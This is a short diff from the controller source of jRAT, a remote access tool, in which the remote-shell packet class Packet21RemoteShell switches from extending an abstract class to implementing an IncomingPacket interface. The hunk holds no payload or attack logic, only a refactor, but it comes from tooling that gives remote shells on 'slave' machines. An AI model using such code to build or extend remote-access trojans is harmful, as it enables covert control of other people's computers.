@@ -4,7 +4,7 @@ import jrat.controller.Slave;
 import jrat.controller.ui.frames.FrameRemoteShell;
 
 
-public class Packet21RemoteShell extends AbstractIncomingPacket {
+public class Packet21RemoteShell implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
